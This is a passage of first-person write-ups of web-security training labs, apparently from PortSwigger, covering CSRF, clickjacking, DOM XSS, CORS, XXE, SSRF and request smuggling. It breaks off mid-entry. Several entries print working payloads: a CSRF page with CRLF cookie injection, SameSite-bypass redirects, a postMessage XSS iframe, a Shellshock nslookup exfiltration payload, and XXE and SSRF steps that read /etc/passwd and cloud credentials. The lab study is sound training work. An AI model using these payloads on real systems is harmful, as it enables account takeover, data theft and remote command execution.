Repeater, the token was no longer validated. I generated a CSRF proof-of-concept HTML page that performs a GET request to change the email, hosted it on the exploit server, and delivered it to the victim. The victim's browser executed the request, changing their email and solving the lab. The application only validated CSRF tokens for POST requests but ignored them for GET requests, allowing attackers to bypass defenses by simply changing the method."}, {"num": "3.3", "difficulty": "PRACTITIONER", "title": "Token validation dependent on token presence", "content": "After logging in, I intercepted the email change request and tested its CSRF defenses. Modifying the csrf parameter value caused the request to be rejected, but when I deleted the csrf parameter entirely, the request was accepted. This indicated the server validated the token's value only if the parameter existed, but failed to reject requests missing the token altogether. I generated a CSRF proof-of-concept HTML page that submits a POST request without including any csrf parameter, hosted it on the exploit server, and delivered it to the victim. The victim's browser executed the request, changing their email and solving the lab. The application only validated CSRF tokens when they were present, but accepted requests with no token at all, allowing attackers to bypass defenses by simply omitting the parameter. Prevention requires rejecting all state-changing requests that lack a valid CSRF token, regardless of whether the token parameter exists, and implementing additional defenses like SameSite cookies."}, {"num": "3.4", "difficulty": "PRACTITIONER", "title": "Token not tied to user session", "content": "Using two accounts (wiener and carlos), I tested the CSRF protection on the email change functionality. After capturing a valid CSRF token from wiener's session, I switched to a private browser logged in as carlos and intercepted carlos's email change request. I replaced carlos's CSRF token with wiener's token, and the request was accepted. This con\ufb01rmed that while tokens were validated, they were not bound to any speci\ufb01c user session. I then generated a CSRF proof-of-concept HTML containing a fresh token from my account and hosted it on the exploit server. When delivered, the victim's browser submitted the request with my valid token, changing their email and solving the lab. The application validates CSRF tokens globally but fails to associate them with individual user sessions, allowing tokens from one user to be reused for another."}, {"num": "3.5", "difficulty": "PRACTITIONER", "title": "Token tied to non-session cookie", "content": "After logging into my account, I examined the email change request and noticed two cookies: the standard session cookie and a separate csrfKey cookie. Modifying the session cookie logged me out, but changing the csrfKey cookie only caused the CSRF token to be rejected, indicating the token was tied to this separate cookie rather than the session itself. I then tested with my second account (carlos) and con\ufb01rmed that swapping both the csrfKey cookie and the csrf parameter from wiener's account into carlos's request made it succeed. To exploit this, I used the search function which re\ufb02ected input in the Set-Cookie header without CSRF protection. I crafted a URL to inject my csrfKey cookie into the victim's browser using CRLF injection. I then created a CSRF proof-of-concept HTML form for the email change, removed its auto-submit script, and added an <img> tag that loaded my injection URL and then submitted the form. When delivered, the victim's browser received my csrfKey cookie and submitted the request with my valid CSRF token, changing their email. The CSRF token was tied to a separate csrfKey cookie that could be set independently of the session, and the application had a cookie injection vulnerability via the search function. This allowed attackers to set the required cookie in the victim's browser and use a matching token."}, {"num": "3.6", "difficulty": "PRACTITIONER", "title": "Token duplicated in cookie", "content": "This application has a CSRF defense that relies on the token in the request body matching the token in a cookie. To exploit this, use a vulnerable endpoint (like search) that re\ufb02ects user input into a Set-Cookie header to inject a cookie with an arbitrary token value via CRLF injection. Test : I remove few tokens , it works. I try to search and send the request to repeater then change it to payload. Then submit a form to change the email with the same token value in both the hidden \ufb01eld and the cookie, the server accepts the request because they match. <html> <body> <!-- Step 1: Set the csrf cookie via CRLF injection in the search parameter --> <img src=\"https://0a2d005c033ea8e880d50dc4007f009c.web-security-academy.net/?search=x%0 d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None%3b%20Path=/\" onerror=\"document.forms[0].submit()\"> <!-- Step 2: Form to change email, using the same csrf token value --> <form action=\"https://0a2d005c033ea8e880d50dc4007f009c.web-security-academy.net/my-accoun t/change-email\" method=\"POST\"> <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\" /> <input type=\"hidden\" name=\"csrf\" value=\"test\" /> </form> </body> </html>"}, {"num": "3.7", "difficulty": "PRACTITIONER", "title": "SameSite Lax bypass via method override", "content": "The server uses default SameSite=Lax cookies, meaning the session cookie is only sent with top\u2011level cross\u2011site GET requests, not with POST requests. However, the email change endpoint accepts a _method=POST parameter in the URL, allowing a GET request to be treated as a POST The attack exploits this by tricking the victim into visiting a malicious page that triggers a top\u2011level GET request to <script> document.location = \"https://0a06001b041828cb804c030a006e00dd.web-security-academy.net/my-account/chan ge-email?email=pwned@web-security-academy.net&_method=POST\"; </script> Because it\u2019s a top\u2011level navigation, the browser includes the session cookie, and the server processes it as a POST request, changing the email without any CSRF token."}, {"num": "3.8", "difficulty": "PRACTITIONER", "title": "SameSite Strict bypass via client-side redirect", "content": "When i log-in , i just notice it has a \u201cSAME-STRICT\u201d cookie on the response.This the browser will not send the session cookie in cross-site requests even top-level navigations due to the SameSite=Strict attribute. This is javascript redirect logic, after i input a comment on certain post.After a few seconds, the user is automatically redirected back to the homepage using JavaScript. I then send it to repeater and tryna test it. Try this request : /post/comment/con\ufb01rmation?postId=foo Then test /post/comment/con\ufb01rmation?postId=1/../../my-account . Despite of the cookie Same Strict, the website still redirect within the same origin.So, we create a cross-site script that loads this con\ufb01rmation page and lets the site redirect the victim while maintaining their session. <script> document.location = \"https://0a1a00d20490517b80ab031d008f00eb.web-security-academy.net/post/comment/c on\ufb01rmation?postId=1/../../my-account/change-email?email=bend%40user.net%26submit=1\"; </script>"}, {"num": "3.9", "difficulty": "PRACTITIONER", "title": "SameSite Strict bypass via sibling domain", "content": "I add cms-<domain.id> So, i can able to see the sibling domain. The cms- login form was vulnerable to XSS payload. We got POST request but change it to GET. Since the cms subdomain is part of the same site, it bypasses SameSite cookie restrictions, enabling a Cross-Site WebSocket Hijacking (CSWSH) attack. Crafting a malicious payload to establish a WebSocket connection to the /chat endpoint. Sending intercepted WebSocket messages to an attacker-controlled server. I send more payload scripts so i can able to see the response about the password. Now, im able to see that Carlos forgot his password and i grab the new password to login. The key lesson from this lab is that SameSite cookie restrictions do not protect against attacks originating from sibling domains (subdomains of the same site)."}, {"num": "3.10", "difficulty": "PRACTITIONER", "title": "SameSite Lax bypass via cookie refresh", "content": "Log-in using the own credentials wiener then change the email. The session cookie uses default SameSite=Lax restrictions, which can be bypassed by refreshing the cookie via OAuth or a similar mechanism, allowing a cross-site request to succeed. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level. The lab uses a 2-minute loophole: after OAuth login, the session cookie is fresh and browsers temporarily allow it in cross\u2011site POSTs. Just host a basic form that submits an email change if delivered within that window, the request succeeds and changes the victim's email. No CSRF token needed. I send this to the victim 2x and im shock that i solved already the lab."}, {"num": "3.11", "difficulty": "PRACTITIONER", "title": "Referer validation dependent on header presence", "content": "This is vulnerable on the email address functionality. Attempt to change the email address and then send the POST request to the repeater. As we observed here there;s a REFERER HTTP header that is rejected if we manipulate or edit it. So, get rid of it and now success. Go to exploit server and then i paste this, The server validates the Referer header only when it's present or exists, if the header is missing, the request is still accepted. By adding <meta name=\"referrer\" content=\"no-referrer\">, the browser omits the Referer header entirely, allowing the forged CSRF POST request to change the email without triggering validation."}, {"num": "3.12", "difficulty": "PRACTITIONER", "title": "Broken Referer validation", "content": "I change the Referer header with an new strings, and still the website accept my request. The Referer validation is broken: it accepts any Referer as long as it contains the expected domain. Add referrer policy on the header section. The script exploits weak Referer validation by forcing the browser to send a crafted Referer header containing the target domain. It uses history.pushState() to append the lab's domain as a query string to the exploit page's URL without reloading. A hidden form then automatically submits a POST request to change the victim's email. With Referrer-Policy: unsafe-url set on the exploit server, the browser includes the full modi\ufb01ed URL (with the lab domain) in the Referer header. Since the server only checks if the Referer contains the lab domain anywhere, the request is accepted and the email is changed, successfully executing the CSRF attack."}]}, {"num": "4", "title": "Clickjacking", "labs": [{"num": "4.2", "difficulty": "APPRENTICE", "title": "Clickjacking with pre\ufb01lled form input", "content": "The goal here is to change the email address by the user. By clicking the click me decoy,where it con\ufb01rmed by the user to the changed email address. Log in using credentials wiener:peter, Navigate to your account page (/my-account). Notice the \"Update email\" form.Observe that the page accepts a URL parameter: /my-account?email=value - this pre\ufb01lls the email \ufb01eld! Go to the exploit server and paste the basic clickjacking HTML template into the Body section. Then modify the iframe source by adding the email parameter like this: ?email=hacker@evil.com , we\u2019ll adding the form with a new email address, making sure to use one that's different from your own since the victim cannot take an already-registered email. Next, adjust the CSS values (top, left, width, height) to perfectly align the decoy with the \"Update email\" button underneath. Once everything is aligned correctly, click \"View exploit\" to test it, then hit \"Store\" to save your changes. Lastly is i deliver the exploit to the victim by clicking \"Deliver exploit to victim\" when they click what looks like a harmless \"Click me\" button, they'll actually be updating their email to the address you speci\ufb01ed."}, {"num": "4.3", "difficulty": "APPRENTICE", "title": "Clickjacking with frame buster script", "content": "This application uses a frame buster script to prevent the page from being embedded in an iframe. However, the sandbox=\"allow-forms\" attribute can disable the frame buster, allowing clickjacking. First log-in as wiener and On the exploit server i create a HTML page with an iframe pointing to the account page so we can bypass the frame buster. The frame buster script is designed to detect if the page is inside an iframe and, if so, break out of it by redirecting the top\u2011level window to the original page, thereby preventing clickjacking"}, {"num": "4.4", "difficulty": "PRACTITIONER", "title": "Clickjacking leading to DOM-based XSS", "content": "I constructed a clickjacking attack that tricks the victim into triggering a DOM-based XSS vulnerability. I went to the exploit server and pasted the provided HTML template into the Body section, then customized it to point to the target website's \"Submit feedback\" page. The iframe URL included an XSS payload so that when the page loads and the button is clicked, the print function executes.I adjusted the iframe dimensions to properly cover the target button and set the decoy div's. I properly aligned the text \"Click Me\" to the button then if it was fully alligned, i change the opacity to 0.0001 . Lastly, i stored the exploit, and delivered it to the victim. When the victim clicked what appeared to be a harmless button, they actually clicked through the transparent iframe and triggered the XSS payload, successfully solving the lab. The page likely contains JavaScript that reads the name parameter from the URL and inserts it into the page. When the victim clicks the button (through clickjacking), this triggers the JavaScript to process that parameter and inject the image tag into the DOM. The onerror=print() then executes because the image fails to load."}, {"num": "4.5", "difficulty": "PRACTITIONER", "title": "Multi-step clickjacking", "content": "This involves account functionality protected by both a CSRF token and a con\ufb01rmation dialog designed to prevent clickjacking attacks. I will constructed an attack that tricks the victim into clicking the delete account button and then con\ufb01rming the action through two separate decoy elements labeled \"Click me \ufb01rst\" and \"Click me next\". First is to logging into the target website using the provided credentials wiener:peter and navigating to the user account page, I went to the exploit server and pasted the provided HTML template into the Body section. I set the \ufb01rst click positioning \"Click me \ufb01rst\" aligned over the \"Delete account\" button, and the second click positioning \"Click me next\" aligned over the \"Yes\" con\ufb01rmation button. I set the opacity to 0.1 during testing to verify alignment and later changed it to 0.0001 for the \ufb01nal exploit. After testing that hovering over each decoy showed a hand cursor and clicking them in sequence triggered the intended actions,stored the exploit, and delivered it to the victim. When the victim clicked through both decoys, they unknowingly deleted their account despite the CSRF token and con\ufb01rmation dialog protections."}]}, {"num": "5", "title": "DOM-Based Vulnerabilities", "labs": [{"num": "5.2", "difficulty": "PRACTITIONER", "title": "DOM XSS via web messages and JavaScript URL", "content": "<iframe src=\"https://0a18005b03e4554080b7033c009d0099.web-security-academy.net/\" onload=\"this.contentWindow.postMessage('javascript:print()//http:','*')\"> This script sends a web message containing an arbitrary JavaScript payload, along with the string \"http:\". The second argument speci\ufb01es that any targetOrigin is allowed for the web message. When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the \"http:\" string and proceeds to send the payload to the location.href sink, where the print() function is called."}, {"num": "5.3", "difficulty": "PRACTITIONER", "title": "DOM XSS via JSON.parse", "content": "This involves a DOM-based cross-site scripting vulnerability arising from insecure web message handling with JSON parsing. The application implements a window event listener that accepts incoming messages via postMessage, parsing the data with JSON.parse without proper validation. The parsed object contains a type property used in a switch statement, where the load-channel case dynamically sets an iframe src attribute using a url property from the message. The attack surface is the message event listener and the postMessage API, speci\ufb01cally targeting the url parameter that can accept javascript: URIs to execute arbitrary code. The lab's event listener, lacking origin validation, processes the message, parses the JSON, and sets the iframe src to the javascript:print() payload, which executes the print function in the victim's browser context and solves the lab."}, {"num": "5.4", "difficulty": "PRACTITIONER", "title": "DOM-based open redirection", "content": "The blog page uses an onclick handler that extracts a url parameter with regex and sets location.href to it, redirecting the browser. Attack surface is the url parameter. This source code of the home page blog contains a link that returns to the homepage. https://0af6001403524939899ef659001d004a.web-security-academy.net/post?postId=4&url =https://exploit-0adc00db036f4954892bf58601d8007c.exploit-server.net"}, {"num": "5.5", "difficulty": "PRACTITIONER", "title": "DOM-based cookie manipulation", "content": "The home page stores a lastViewedProduct cookie containing the URL of the last visited product page. This cookie value is later used unsafely, allowing script injection. Attack surface is the cookie, which can be poisoned via a crafted URL. The onload event immediately redirects the victim to the home page using the same iframe, leaving the poisoned cookie saved. When the home page reads the cookie and injects its value into the DOM, the script executes, calling print() and solving the lab."}, {"num": "5.6", "difficulty": "EXPERT", "title": "DOM clobbering to enable XSS", "content": "This has a DOM clobbering vulnerability hiding in the comment section. The page uses a dangerous pattern: let defaultAvatar = window.defaultAvatar || {avatar: '/image.svg'}. If we can clobber window.defaultAvatar with HTML, we can hijack the avatar property and smuggle an XSS payload. DOMPurify is supposed to protect us, but it lets the cid: protocol through without encoding quotes. I posted a comment with two anchor tags, both using the same id=\"defaultAvatar\". That tricks the browser into grouping them into a collection, clobbering the defaultAvatar variable. The second anchor has name=\"avatar\" and an href starting with cid: followed by \"onerror=alert(1)//. Because cid: doesn't encode double quotes, the payload survives sanitization. Now defaultAvatar.avatar holds cid:\"onerror=alert(1)//. I waited, then posted another random comment. When the page reloaded to show comments, the clobbered variable kicked in, the browser tried to load that cid: URL, failed, and \ufb01red the onerror event, popping alert() and solving the lab."}, {"num": "5.7", "difficulty": "EXPERT", "title": "DOM attribute clobbering to bypass \ufb01lters", "content": "This exploits DOM clobbering to bypass the HTMLJanitor \ufb01lter. The library \ufb01lters attributes by checking the attributes property on elements, but that property itself can be clobbered with HTML. Once the attributes property is replaced, the \ufb01lter no longer sees the real attributes, letting us smuggle malicious event handlers through. I posted a comment containing a form element with id=x and onfocus=print(), plus an input tag with id=attributes. That input clobbered the form's attributes property, making the \ufb01lter think it had no attributes to sanitize. Then I built an iframe on the exploit server pointing to that same blog post. After a 500ms delay, the iframe added #x to the URL, forcing the browser to focus the form element. The onfocus \ufb01red, called print(), and solved the lab. DOM clobbering isn't just about overwriting variables, it can blind security mechanisms by clobbering their helper properties. The attributes property seemed safe but became the weakest link. This shows how sanitizers must account for attackers manipulating the very properties they rely on to do their job."}]}, {"num": "6", "title": "Cross-Origin Resource Sharing (CORS)", "labs": [{"num": "6.2", "difficulty": "APPRENTICE", "title": "Trusted null origin miscon\ufb01guration", "content": "This has an insecure CORS configuration that it trusts the null origin. First is i check the intercept was off then i login using the own credentials wiener. Reviewing the history tab and we retrieved a AJAX request to /accountDetails and has a response Access-Control-Allow-Credentials. Then go to exploit server and enter the HTML payload: This iframe uses an attribute sandbox that enables the speci\ufb01c permissions while preventing others. The srcdoc makes an authenticated XMLHttpRequest to the lab\u2019s or accountDetails endpoint (which returns sensitive account data) and then sends the response to the attacker\u2019s exploit server using a location redirect. Because the iframe payload is sandboxed, it can run scripts but still same origin as with the parent page. I go to the logs and see thie key token log."}, {"num": "6.3", "difficulty": "PRACTITIONER", "title": "Trusted insecure protocol miscon\ufb01guration", "content": "My intercept was off and my burp foxyproxy extension was \u201con\u201d. I use my on credentials to log-in then when i logged in. i got the following request\u2019s in HTTP history: I send this /accountDetails to repeater because it contains the Access-Control-Allow-Credentials header. You need to input this \u201cOrigin : https://lab-id\u201d to get that Access Control. We just con\ufb01rmed that the CORS con\ufb01guration allows access from arbitrary subdomains, both HTTPS and HTTP. Then i go to home page so that i can click the Check stock and observe what will happen,It pops up a new website subdomain. It looks like that the productID was vulnerable to XSS."}]}, {"num": "7", "title": "XML External Entity (XXE) Injection", "labs": [{"num": "7.2", "difficulty": "APPRENTICE", "title": "SSRF via XXE", "content": "The \"Check stock\" feature on product pages accepts XML input and re\ufb02ects unexpected values in the response, making it vulnerable to XXE. By injecting an external entity, we can force the server to make a request to an internal endpoint, performing an SSRF attack. The goal is to retrieve the IAM secret access key from the EC2 metadata service at http://169.254.169.254/.After intercepting the POST request in Burp Suite, I inserted the following XML external entity de\ufb01nition: Then I replaced a product ID parameter with the entity reference &xxe;. The response revealed a folder name (e.g., latest/). I iteratively updated the URL in the entity de\ufb01nition, navigating through the metadata API path: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin .Eventually, the response returned JSON containing the SecretAccessKey, which I captured to solve the lab."}, {"num": "7.3", "difficulty": "PRACTITIONER", "title": "Blind XXE with out-of-band interaction", "content": "A stock check feature parses XML input but never displays the response, making any XML external entity vulnerability blind. The application processes user supplied XML and resolves external entities, allowing out of band data ex\ufb01ltration. Attack surface is the XML parser and its handling of external entity de\ufb01nitions. I navigated to a product page and intercepted the Check Stock request in Burp Suite. Inside the XML, I inserted a DOCTYPE declaration de\ufb01ning an external entity pointing to my Burp Collaborator domain. Then I replaced a productId value with a reference to that entity. When the application parsed my XML, it resolved the entity and made a DNS lookup and HTTP request to Collaborator. Polling Collaborator showed the interactions, con\ufb01rming the blind XXE and solving the lab. The lesson is that blind XXE vulnerabilities are invisible during normal interaction but leak through out of band channels, making them detectable only through network monitoring and proving that no output doesn't mean no exploitation."}, {"num": "7.4", "difficulty": "PRACTITIONER", "title": "Blind XXE via parameter entities", "content": "A stock check feature parses XML input but blocks regular external entities and never displays output. Parameter entities can bypass this \ufb01lter and still trigger out of band interactions. Attack surface is the XML parser and its handling of parameter entities within DTDs. I intercepted the Check Stock request and inserted a DOCTYPE declaration de\ufb01ning a parameter entity pointing to my Burp Collaborator domain. Unlike regular entities, this one uses the percent symbol syntax. I immediately invoked the parameter entity within the same DOCTYPE. When the XML parser processed the document, it resolved the parameter entity and made a DNS lookup and HTTP request to Collaborator. Polling Collaborator con\ufb01rmed the blind XXE and solved the lab. The blind XXE exploitation doesn't need output re\ufb02ection and can bypass \ufb01lters by using alternative entity types, making thorough parser hardening essential."}, {"num": "7.5", "difficulty": "PRACTITIONER", "title": "Data ex\ufb01ltration using malicious external DTD", "content": "The stock check feature parses XML input but never displays output, making it a blind XXE vulnerability. Regular external entities may be blocked, but parameter entities can load an external DTD. This external DTD can read local \ufb01les and send them to an attacker-controlled server via out-of-band HTTP request. I hosted a malicious DTD on the exploit server containing two parameter entities: one reads /etc/hostname, another dynamically constructs an entity that ex\ufb01ltrates the \ufb01le content to my Burp Collaborator domain. I then intercepted the Check Stock request and injected a DOCTYPE with a parameter entity pointing to my DTD. When the application parsed the XML, it fetched my DTD, which executed the \ufb01le read and triggered an HTTP request to Collaborator carrying the hostname. Polling Collaborator revealed the \ufb01le contents, solving the lab. The blind XXE can still ex\ufb01ltrate data through a two-stage attack, where the \ufb01rst stage loads a payload from an external source, demonstrating that input validation must consider both direct and indirect entity inclusion."}, {"num": "7.6", "difficulty": "PRACTITIONER", "title": "Error-based data retrieval", "content": "The stock check feature parses XML input without displaying output, making it a blind XXE vulnerability. Parameter entities can load external DTDs, and forcing invalid \ufb01le paths triggers error messages that leak \ufb01le contents. Attack surface is the XML parser and its verbose error reporting. I hosted a malicious DTD on the exploit server with two parameter entities. The \ufb01rst reads /etc/passwd, the second tries to use that \ufb01le content in an invalid \ufb01le path. This forces the parser to include the \ufb01le content inside the resulting error message. I intercepted the Check Stock request and injected a DOCTYPE with a parameter entity pointing to my DTD. When the application fetched and processed my DTD, the parser attempted to open the invalid path, failed, and returned an error message containing the entire /etc/passwd \ufb01le, solving the lab. Prevention requires disabling external entity resolution, DTD processing, and verbose error messages. Even without outbound channels, error messages can leak sensitive data when parsers expose internal values. Error based ex\ufb01ltration turns parser failures into data leaks, proving that blind XXE doesn't need network access when verbose errors are enabled."}, {"num": "7.7", "difficulty": "PRACTITIONER", "title": "XInclude exploitation", "content": "The stock check feature embeds user input into a server side XML document for processing. DTD de\ufb01nitions are not allowed, but XInclude provides an alternative method to include external \ufb01les. Attack surface is the productId parameter that gets placed directly into the XML. Intercept the Check Stock request and replace the productId value with an XInclude payload. The injection forces the XML parser to include the contents of /etc/passwd. The response returns the \ufb01le data, solving the lab."}, {"num": "7.8", "difficulty": "PRACTITIONER", "title": "XXE via image upload", "content": "The avatar upload feature processes images using Apache Batik, which handles SVG \ufb01les as XML documents. SVG images support XML external entities, making \ufb01le upload a vector for XXE attacks. Attack surface is the image upload functionality that parses XML content. I created an SVG \ufb01le containing a DOCTYPE with an external entity pointing to /etc/hostname and a text element referencing that entity. I posted a comment and uploaded this SVG as my avatar. When the application processed the image, the XML parser resolved the entity and displayed the hostname inside the rendered text. I submitted the hostname and solved the lab. The XML based image formats like SVG introduce unexpected XXE vectors, proving that every XML parser in the application must be hardened regardless of its intended purpose."}, {"num": "7.9", "difficulty": "EXPERT", "title": "Local DTD repurposing for data retrieval", "content": "The stock check feature parses XML input but hides output, a blind XXE. External DTDs are blocked, but we can reference a local DTD \ufb01le on the server. By rede\ufb01ning an entity inside that DTD, we force an error that leaks the contents of /etc/passwd. Attack surface is the XML parser's ability to include local DTDs and the error reporting mechanism. I injected a DOCTYPE that \ufb01rst loads that local DTD using a parameter entity, then rede\ufb01nes ISOamso with my own malicious entity. Inside that rede\ufb01nition, I read /etc/passwd and then cause a syntax error by trying to use that \ufb01le content in a \ufb01le path. When the parser processes the rede\ufb01ned entity, it generates an error message that includes the \ufb01le content, and the response reveals /etc/passwd, solving the lab."}]}, {"num": "8", "title": "Server-Side Request Forgery (SSRF)", "labs": [{"num": "8.2", "difficulty": "APPRENTICE", "title": "Basic SSRF against a secondary back-end system", "content": "This lab features a stock check functionality that fetches data from an internal system, making it vulnerable to Server-Side Request Forgery (SSRF). The objective is to scan the internal 192.168.0.X network range on port 8080 to locate a hidden admin interface, then use it to delete user Carlos. I began by visiting a product page and clicking \"Check stock,\" intercepting the request in Burp Suite. After sending it to Intruder, I modi\ufb01ed the stockApi parameter to http://192.168.0.1:8080/admin and highlighted the \ufb01nal octet (the number 1) to add a payload position marker (\u00a7). In the Payloads panel, I set the payload type to Numbers with a range from 1 to 255 and a step of 1, then started the attack. After the scan completed, I sorted the results by status code and identi\ufb01ed a single entry returning a 200 response, con\ufb01rming the admin interface was live at that speci\ufb01c IP address. I sent this request to Repeater and modi\ufb01ed the stockApi parameter path to /admin/delete?username=carlos, delivering the \ufb01nal SSRF payload that successfully deleted the target user and solved the lab. This shows how insu\ufb03cient validation of user-supplied URLs allows attackers to pivot from the vulnerable server into internal networks."}, {"num": "8.3", "difficulty": "PRACTITIONER", "title": "Blind SSRF with out-of-band detection", "content": "The site uses analytics software that fetches the URL speci\ufb01ed in the Referer header when loading product pages. This creates a blind SSRF vulnerability where we can force the server to make requests to arbitrary domains. Attack surface is the Referer header processed by the backend analytics component. I loaded a product page and intercepted the request in Burp Suite. I sent it to Repeater, selected the Referer header, and replaced the domain with a Burp Collaborator payload. After sending the request, I polled the Collaborator tab and saw DNS and HTTP interactions from the application, con\ufb01rming the blind SSRF and solving the lab. The blind SSRF vulnerabilities are invisible during normal interaction but reveal themselves through out of band channels, and seemingly harmless header values can trigger server side requests to attacker controlled endpoints."}, {"num": "8.4", "difficulty": "PRACTITIONER", "title": "SSRF with blacklist-based input \ufb01ltering", "content": "The stock check feature lets us control the URL in the stockApi parameter to fetch product data. The developers added a blacklist to block access to localhost, but we can bypass it. Goal is to reach http://localhost/admin and delete the user carlos. I intercepted the Check Stock request and changed the stockApi parameter to http://127.0.0.1/admin. The application blocked it. I tried http://127.1/ and it worked because 127.1 resolves to localhost and bypassed the IP \ufb01lter. But when I added /admin, it got blocked again. The \ufb01lter was also looking for the string \"admin\". I double URL encoded the letter \"a\" as %2561, making the path /%2561dmin. The server decoded it once during request handling, then the backend decoded it again, turning it back to /admin. The blacklist only checked the raw input, not the \ufb01nal decoded value. I sent the request with http://127.1/%2561dmin and the admin panel loaded. I deleted carlos and solved the lab. The real problem here is trying to block bad stuff instead of allowing only good stuff. 127.1 worked because developers blocked 127.0.0.1 but forgot about other localhost representations."}, {"num": "8.5", "difficulty": "PRACTITIONER", "title": "SSRF \ufb01lter bypass via open redirection", "content": "The stock check feature fetches data from internal systems using the stockApi parameter. Direct SSRF is blocked and only local application URLs are allowed. But the application has an open redirection vulnerability we can chain with the stock checker. Attack surface is the stockApi parameter combined with the /product/nextProduct endpoint that redirects. I intercepted the Check Stock request and tried changing stockApi to an external IP but it was blocked. I noticed the next product functionality had an open redirect the path parameter gets placed into the Location header. I crafted a URL using that redirect to point to the internal admin interface: /product/nextProduct?path=http://192.168.0.12:8080/admin. I fed this into the stockApi parameter. The stock checker fetched this URL, followed the redirect, and loaded the admin page. I then modi\ufb01ed the path to delete carlos: /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos The stock checker trusted the redirect because it came from the same application. Chain two weaknesses together and suddenly the \ufb01lter doesn't matter."}, {"num": "8.6", "difficulty": "EXPERT", "title": "Blind SSRF with Shellshock exploitation", "content": "The web application uses analytics software that fetches whatever URL you put in the Referer header. That\u2019s a blind SSRF vulnerability the server makes a request to a URL you control.The goal is to make the internal server execute whoami and send the result back to us via a DNS lookup to Burp Collaborator. I \ufb01rst start to test/scan this using site map -> Add to scope. The vulnerabilities would appear after a few minutes. So the vulnerability is on the product page. it triggered an HTTP interaction to Collaborator using the Referer header. The request also contained my User-Agent string. I sent the product page request to Burp Intruder. I generated a fresh Collaborator domain and built a Shellshock payload: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN I replaced the User-Agent header with that payload. I set the Referer header to http://192.168.0.1:8080, then highlighted the last octet (the 1) and added a payload position. I told Intruder to try numbers 1 through 255, one by one. I started the attack. After it \ufb01nished, I polled Collaborator. I saw DNS interactions for one of the IPs and it is peter-R9llj3 , the internal server had executed the Shellshock command, looked up its own username, and sent it as a subdomain to my Collaborator. The username appeared in the DNS name. I submitted that username to solve the lab. This has two vulnerabilities which is the blind SSRF (The Referer header) and Shellshock (The User-Agent). The internal server was vulnerable to Shellshock, so when it received the SSRF\u2011triggered request, it ran the injected command and leaked the username through a DNS query."}, {"num": "8.7", "difficulty": "PRACTITIONER", "title": "SSRF with whitelist-based input \ufb01ltering", "content": "This has a \u201cCheck stock\u201d feature that lets you control a URL. The developer added a whitelist to block unwanted addresses, but we can sneak past it by exploiting how URLs are parsed. Our goal is to reach the admin panel at http://localhost/admin and delete the user carlos. Send to repeater. On the stockapi we noticed that it was using a URL Encoding. The vulnerability was on that area so we try to test it out. I started by intercepting the stock check request and changed the URL to http://127.0.0.1/. The app rejected it it\u2019s parsing the hostname and checking it against a whitelist. I tried http://username@stock.weliketoshop.net/ and it worked, meaning the URL parser understands embedded credentials. Then I added a # after the username, and the request was blocked again. To bypass, I double\u2011URL\u2011encoded the # as %2523. This time the server gave an \u201cInternal Server Error\u201d, which hinted that it tried to connect to the username part. So I combined everything : http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos. (response 200): The server sees the whitelisted domain stock.weliketoshop.net, but due to the double\u2011encoded #, the actual host used is localhost. The request reached the admin panel and deleted carlos, solving the lab. The developer used a whitelist to check the hostname, but the URL parser treats the part before @ as credentials and the part after # as a fragment. By encoding the # twice, we caused the server to interpret the URL differently and connect to localhost instead of the whitelisted domain."}]}, {"num": "9", "title": "HTTP Request Smuggling", "labs": [{"num": "9.2", "difficulty": "PRACTITIONER", "title": "TE.CL request smuggling", "content": "I sent a request with Transfer-Encoding: chunked and Content-Length: 4. The chunk size \"5e\" tells the front-end to read 94 bytes, which includes the smuggled POST /404 request and the \"0\" terminator. Front-end forwarded everything as one request. Back-end ignored Transfer-Encoding, saw Content-Length: 4, read only the \ufb01rst 4 bytes \"5e\\r\\n\", and left the rest sitting in the connection buffer. The smuggled request stayed there waiting. When I sent a second normal request for /, back-end processed the smuggled POST /404 instead, returned a 404 response, and solved the lab."}, {"num": "9.3", "difficulty": "PRACTITIONER", "title": "Con\ufb01rming CL.TE via differential responses", "content": "The application uses front-end and back-end servers with inconsistent HTTP parsing. Front-end doesn't support chunked encoding and uses Content-Length. Back-end honors Transfer-Encoding. This CL.TE discrepancy creates request smuggling. The front-end blocks access to /admin, but the back-end doesn't. Attack surface is the HTTP headers and the smuggled request path. I tried visiting /admin directly and got blocked. I sent a request with both Content-Length and Transfer-Encoding headers. Front-end used Content-Length and forwarded only the \ufb01rst chunk, leaving the smuggled GET /admin sitting in the buffer. The back-end processed it but rejected it because it lacked Host: localhost. I added Host: localhost to the smuggled request but got blocked again, the front-end saw con\ufb02icting Host headers. I adjusted Content-Length to 116, making the smuggled request longer and pushing the second request's headers into the smuggled request's body. This time the back-end accepted it. I used the response to craft a \ufb01nal request deleting carlos: GET /admin/delete?username=carlos with Host: localhost and enough padding to absorb the follow-up request headers, solving the lab."}, {"num": "9.4", "difficulty": "PRACTITIONER", "title": "Con\ufb01rming TE.CL via differential responses", "content": "The application uses front-end and back-end servers with inconsistent HTTP parsing. Front-end supports chunked encoding and uses Transfer-Encoding. Back-end doesn't support chunked encoding and falls back to Content-Length. This TE.CL discrepancy creates request smuggling. The front-end blocks access to /admin, but the back-end doesn't. Attack surface is the HTTP headers controlling request boundaries. I tried visiting /admin directly and got blocked. I turned off Burp's Update Content-Length option. I sent a request with Transfer-Encoding: chunked and Content-Length: 4. The chunk size told the front-end to read a speci\ufb01c number of bytes containing the smuggled POST /admin request. Front-end forwarded everything as one request. Back-end ignored Transfer-Encoding, saw Content-Length: 4, read only the chunk header, and left the smuggled request sitting in the buffer. The back-end processed it but rejected it because it lacked Host: localhost. I adjusted the chunk size to include Host: localhost in the smuggled request and sent it twice. This time the back-end accepted it and returned the admin panel. I then changed the smuggled request to GET /admin/delete?username=carlos with the correct chunk size, sent it twice, and deleted carlos to solve the lab."}, {"num": "9.5", "difficulty": "PRACTITIONER", "title": "TE header obfuscation", "content": "The application uses front-end and back-end servers with inconsistent HTTP parsing. Front-end doesn't support chunked encoding and uses Content-Length. Back-end honors Transfer-Encoding. This CL.TE discrepancy creates request smuggling. The admin panel at /admin is restricted to 127.0.0.1, and the front-end adds a custom IP header to requests. Attack 